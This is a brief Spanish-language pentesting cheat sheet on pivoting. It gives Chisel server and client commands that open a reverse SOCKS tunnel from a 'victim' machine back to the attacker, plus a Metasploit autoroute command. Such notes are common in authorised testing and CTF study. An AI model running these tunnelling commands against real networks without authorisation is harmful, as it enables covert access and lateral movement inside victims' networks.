# Pivoting & PortForwarding con Chisel y Metasploit

#### Chisel

<pre>
  <code>
    # Servidor (Atacante)
    
./chisel server -p (puerto) --reverse --socks

# Cliente (Máquina víctima)
    
./chisel client (ip):(puerto) R:socks

  </code>
</pre>

## Metasploit

<pre>
  <code>
run autoroute -s (IP)/20
  </code>
</pre>
